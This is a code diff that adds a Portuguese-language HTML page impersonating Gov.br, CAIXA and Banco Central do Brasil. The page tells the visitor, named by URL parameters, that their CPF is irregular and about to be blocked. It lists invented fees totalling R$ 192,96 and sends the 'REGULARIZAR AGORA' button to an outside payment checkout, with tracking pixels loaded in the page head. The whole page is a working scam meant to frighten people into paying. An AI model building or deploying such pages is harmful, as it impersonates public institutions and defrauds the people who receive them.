@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Sharp:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200&icon_names=person" />
+    <title>Irregularidade no CPF - Gov.br</title>
+    <script>
+  window.pixelId = "6a5ae57f2a3f9d88d0986af5";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <script>
+        localStorage.setItem("upsell", "up8/index.html");
+    </script>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'caixa-blue2': '#047094',
+                        'caixa-light-blue2': '#047094'
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #dde1e7, #ffffff);
+        }
+
+        .card-header {
+            background: linear-gradient(135deg, #FFD200, #FFD200);
+        }
+
+        .alert-warning {
+            background: #fff3cd;
+            border-left: 5px solid #ffae42;
+        }
+
+        .btn-primary {
+            background: #047094;
+            border: none;
+            transition: all 0.3s ease-in-out;
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #047094, #047094);
+            transform: scale(1.05);
+        }
+
+        .bg-gradient-to-r {
+            background: linear-gradient(to right, #047094, #047094);
+        }
+    </style>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+</head>
+
+<body class="justify-content-center align-items-center h-screen">
+    <div class="bg-gradient-to-r from-caixa-blue2 to-caixa-light-blue2 text-white px-4 py-2">
+        <div class="flex items-center">
+            <!-- Logo X da CAIXA -->
+            <div class="size-12 rounded flex items-center justify-center mr-3">
+                <img src="../assets/image/logowhite.png" alt="BC" class="h-12 w-auto">
+            </div>
+
+            <!-- Título e data -->
+            <div>
+                <p class="text-sm font-medium" id="userName">Nome do Usuário</p>
+                <p class="text-sm font-medium" id="userDocument">000.000.000-00</p>
+            </div>
+        </div>
+    </div>
+    </div>
+    <div class="w-full p-3">
+        <div class="card-body text-center">
+            <h4 class="text-danger fw-bold ">⚠️ IRREGULARIDADE NO CPF - BLOQUEIO IMINENTE ⚠️</h4>
+            <p class="text-muted mt-3">
+                Seu CPF foi identificado como <span class="fw-bold text-danger">IRREGULAR</span> nos registros da
+                Receita Federal devido a uma pendência na validação da transação. Caso não seja regularizado em tempo
+                hábil, <b>o CPF pode ser suspenso, impossibilitando transações bancárias, compras e emissão de
+                    documentos financeiros.</b> Além disso, o valor previsto para recebimento será <b>bloqueado
+                    permanentemente.</b>
+            </p>
+            <div class="alert alert-danger d-flex align-items-center mt-4" role="alert">
+                <i class="fas fa-exclamation-triangle me-2"></i>
+                <div>🚨 A regularização deve ser feita imediatamente para evitar impactos financeiros e restrições
+                    cadastrais no sistema federal.</div>
+            </div>
+            <div class="alert alert-warning mt-3">
+                <i class="fas fa-map-marker-alt me-2"></i> Detectamos uma pendência vinculada ao CPF. Regularize
+                imediatamente.
+            </div>
+            <h5 class="mt-4">Detalhamento das Taxas</h5>
+            <ul class="list-group text-start mb-3">
+                <li class="list-group-item d-flex justify-content-between">
+                    Taxa administrativa <span>R$ 78,92</span>
+                </li>
+                <li class="list-group-item d-flex justify-content-between">
+                    Taxa de regularização <span>R$ 45,38</span>
+                </li>
+                <li class="list-group-item d-flex justify-content-between">
+                    Multa por atraso <span>R$ 29,70</span>
+                </li>
+                <li class="list-group-item d-flex justify-content-between">
+                    Taxa de processamento <span>R$ 38,96</span>
+                </li>
+                <li class="list-group-item d-flex justify-content-between fw-bold bg-light">
+                    Total <span>R$ 192,96</span>
+                </li>
+            </ul>
+            <a onclick="redirect(event)" class="btn btn-primary btn-lg w-100 mt-4 fw-bold">REGULARIZAR AGORA</a>
+        </div>
+        <div class="card-footer text-center text-muted py-3">
+            © 2026 Banco Central do Brasil - Todos os direitos reservados
+        </div>
+    </div>
+    <script>
+        function redirect(event) {
+            event.preventDefault();
+            var currentUrlParams = window.location.search;
+            window.location.href = "https://pay.asegupag.com/checkout/57e9a442-76c2-4d5b-9def-2cdf33de4038" + currentUrlParams;
+        }
+
+        // Função para formatar CPF
+        function formatCPF(cpf) {
+            // Remove todos os caracteres não numéricos
+            cpf = cpf.replace(/\D/g, '');
+
+            // Aplica a máscara do CPF
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+
+        // Função para obter parâmetros da URL
+        function getUrlParams() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return {
+                name: urlParams.get('name') || 'Usuário',
+                document: urlParams.get('document') || '00000000000'
+            };
+        }
+
+        // Função para atualizar dados do usuário
+        function updateUserData() {
+            const params = getUrlParams();
+            const formattedCPF = formatCPF(params.document);
+
+            document.getElementById('userName').textContent = params.name;
+            document.getElementById('userDocument').textContent = formattedCPF;
+        }
+
+        // Função para atualizar data e hora
+        function updateDateTime() {
+            const now = new Date();
+            const day = String(now.getDate()).padStart(2, '0');
+            const month = String(now.getMonth() + 1).padStart(2, '0');
+            const year = now.getFullYear();
+            const hours = String(now.getHours()).padStart(2, '0');
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+
+            const dateTimeString = `${day}/${month}/${year} - ${hours}:${minutes}`;
+            document.getElementById('currentDateTime').textContent = dateTimeString;
+        }
+
+        // Inicializar dados do usuário e data/hora
+        updateUserData();
+        updateDateTime();
+        setInterval(updateDateTime, 60000);
+    </script>
+    <script src="js/bootstrap.bundle.min.js"></script>
+
+
+</body>
+
+</html>
